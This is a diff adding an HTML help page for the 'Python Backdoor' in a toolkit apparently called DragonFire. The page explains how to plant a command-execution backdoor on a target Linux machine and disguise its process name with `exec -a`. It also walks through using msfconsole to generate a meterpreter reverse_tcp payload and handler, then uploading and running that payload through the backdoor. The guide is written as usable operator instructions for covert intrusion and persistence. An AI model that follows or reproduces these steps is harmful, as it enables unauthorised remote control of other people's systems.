@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="css/bootstrap.min.css">
+  <script src="css/jquery.min.js"></script>
+  <script src="css/bootstrap.min.js"></script>
+  <title>DragonFire</title>
+</head>
+<body>
+
+<!-- begin nav bar !-->  
+ <nav class="navbar navbar-inverse navbar-fixed-top">
+  <div class="container-fluid">
+    <div class="navbar-header">
+	<button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#myNavbar">
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>                        
+      </button>
+      <a class="navbar-brand" href="index.html">DragonFire</a>
+    </div>
+	<div class="collapse navbar-collapse" id="myNavbar">
+    <ul class="nav navbar-nav">
+      <li><a href="windows.html">Windows</a></li>
+      <li><a href="linux.html">Linux</a></li>
+	  <li><a href="other.html">Other Devices</a></li>
+	  <li><a href="misc.html">Misc</a></li>
+    </ul>
+	<ul class="nav navbar-nav navbar-right">
+	</ul>
+	</div>
+  </div>
+</nav>
+<!-- end nav bar !-->  
+
+<!-- begin breadcrumb !-->  
+<div class="container" style="margin-top:50px">
+  <div class="row">
+    <div class="col-md-12">
+
+<nav aria-label="breadcrumb" role="navigation">
+  <ol class="breadcrumb">
+    <li class="breadcrumb-item"><a href="index.html">Home</a></li>
+    <li class="breadcrumb-item"><a href="linux.html">Linux</a></li>
+    <li class="breadcrumb-item active" aria-current="page">Python Backdoor</li>
+  </ol>
+</nav>
+
+</div>
+</div>
+</div>	
+<!-- end breadcrumb !-->  
+
+  
+<!-- begin page contents !-->
+<div class="container">
+  <h3>Python Backdoor</h3>
+  <div class="row">
+    <div class="col-md-8">
+      
+	  <p>This python backdoor can be run on any linux system with python 2.7.  The backdoor listens at all times for an incomming connection from the client.  Once connected it is capable of
+	  command execution and uploads/download.  It can be run once, or combined with various persistence.  Typical use would be as a lightweight persistence through which a full-featured RAT (meterpreter) could be 
+	  moved to target.</p>
+	  <h4>Table of Contents</h4>
+	  <p>Installation
+	  <p>Usage</a>
+	  <p>Example Usage</a>
+	  <p>Known Issues</a>
+      
+       </div>	  
+    <!-- begin information box !-->  
+	<div class="col-md-4">
+      <div class="panel-group">
+      <div class="panel panel-info">
+	  <div class="panel-heading">Information</div>
+      <div class="panel-body">
+	  <p>Work With:  Linux
+	  <br>Requires: Python 2.7</br>
+	  </div>
+     </div>
+     
+     </div>
+    </div>
+   </div>
+   <!-- end information box !-->  
+</div>
+
+<!-- begin main body !-->  
+<div class="container">
+  <div class="row">
+    <div class="col-md-12">
+      
+        
+       <div class="alert alert-warning" role="alert">
+       <p>There is a known issue uploading or downloading file that are exact multiples of 1024 bytes (1024, 2048..etc)  Hash ALL files uploaded and downloaded to be sure they match. See the 'Known Issues' section below for details.</p>
+       </div>	
+
+    	   
+	<h3><a name="installation">Installation</a></h3>
+	<p>1.  Make a copy of <code>/dragonfire/bin/nix_backdoor/server.py</code>.  Open the script and edit the <code>listening port</code> and the <code>key</code>.  Be sure to annotate the key and port.  This is the port the 
+	   server will ALWAYS be listening on, and the key is required to connect.
+	<p><img class="img-responsive" src="images/pybackdoor_changeportkey.jpg"></img>
+	<p>2.  Move the modified script to the target, choosing a name and location that makes sense.
+	<p>3.  Run the script on the target. Where possible, use some obfuscation when running the script.  For example, running the backdoor as <br><code>exec -a "some_nice_name" python < script.py &</code><br> will run the script and only show "some_nice_name" in the process list.  Try it.
+    <p><img class="img-responsive" src="images/pybackdoor_execa.jpg"></img>
+	<p><img class="img-responsive" src="images/pybackdoor_hidden.jpg"></img>
+
+	<p>4.  Test your connection by connecting to the backdoor using the client.
+	
+	<div class="alert alert-warning" role="alert">
+    <p>There is no persistence natively included.  If you want persistence you'll need to set up something to restart the script at boot/user logon, etc.</p>
+    </div>	
+
+	
+	<h3><a name="usage">Usage</a></h3>
+	Connecet to the by running <code>/dragonfire/bin/client.py -a 'ip_address' -p 'port' -k 'key'</code>
+	<p>Once connected to the server, any command you type will run as if it were a normal *nix command on the target.  
+	<p>There is a 15 second timout on all commands run to ensure the backdoor doesn't break on a hung command (such as a ping with no count).
+	If your command takes longer than 15 seconds to complete you will be returned to the prompt.  
+	<p class="bg-danger">Hung commands are often still running after you are returned to the prompt.  Run a process list and kill any stray running processes you created.</p>
+	
+	
+      <div class="panel-group">
+      <div class="panel panel-info">
+	  <div class="panel-heading">Special Commands</div>
+      <div class="panel-body">
+	  <p>Special Commands are typed in all caps
+	  <p><code>UP 'file_to_upload' 'filename on tgt'</code>:  uploads a file</p>
+	  <p><code>DOWN 'file_to_download' 'filename'</code>:  downloads a file</p>
+	  <p><code>LDIR</code>:  List current local working directory</p>
+	  <p><code>LCD 'dir'</code>:  Change current local directory </p>
+	  <p><code>KILL</code>:  Shuts down the server.  If you are doing this to uninstall (likely) be sure to remove any persistence as well.</p>
+	  <p><code>EXIT</code>:  Exits the backdoor.  <kbd>CTRL+C</kbd> will also exit.</p>
+	  </div>
+     </div>
+     </div>
+	 
+	 <h3><a name="example">Example Use</a></h3>
+	 Example of connecting, running some commands, and moving meterpreter to the target.
+     <p> Conneceting to server at <code>192.168.142.131:1337</code> with a key of <code>testkey</code>
+	 <p><img class="img-responsive" src="images/pybackdoor_initialconnect.jpg"></img>
+     <br>Prepare a meterpreter callback</br>
+	 <code>msfconsole -x "use payload/linux/x86/meterpreter/reverse_tcp;set lhost 192.168.142.134;set lport 4444;generate -t elf -f test_meterpreter;exit"</code>
+	 <br>Start the meterpreter handler</br>
+	 <code>msfconsole -x "use exploit/multi/handler;set payload linux/x86/meterpreter/reverse_tcp;set lhost 192.168.142.134;set lport 4444;run"</code>
+	 <br>Upload meterpreter.  Check hashes after upload.
+	 <p><img class="img-responsive" src="images/pybackdoor_uploadmeter.jpg"></img>
+	 <br>Chmod +x the uploaded file and run it. Control will return to you in 15 seconds.
+ 	 <p><img class="img-responsive" src="images/pybackdoor_chmod_run_meter.jpg"></img>
+     <br>You should now have a meterpreter session.  Remove the uploaded meterpreter.  Profit.</br>
+	   <div class="alert alert-warning" role="alert">
+       <p>For some reason meterpreter sesisons hang (on *nix at least) when you 'exit.'  Use <code>kill -9 'PID'</code> from a shell to exit meterpreter.  You can also check a process list from the backdoor after disconnecting.</p>
+       </div>
+	   
+	   
+    <h3><a name="known_issues">Known Issues</h3></a>
+    <p>Sometime things just get stuck.  <kbd>CTRL+C</kbd> will exit and you can reconnect.</p>
+	<p>There is a 5 minute timeout on network comms.  If you exceed that <kbd>CTRL+C</kbd> and reconnect.</p>
+	<p>Uploads and Downloads of exact multiples of 1024 bytes don't work as expected.
+	<br>Uploads will hang indefinitely...wait a minute, <kbd>CTRL+C</kbd> the session, then reconnect and check the hash.
+	<br>Downloads will also hang, but after <kbd>CTRL+C</kbd> out, the local file size will be too large. (data is inadvertantly appended to the end of the file.)
+	<br>Use <code>dd bs=1 if='downloaded_file' of='new_file' count='correct_file_size'</code>
+	<br>This will trim the data from the end.  As always, hash the file to verify</br>
+    </div>
+	</div>
+	
+
+	
+	
+   </div>
+   <br><br><br><br>
+
+
+
+
+
+
+
+
+
+	
+	
+</body>
+</html>
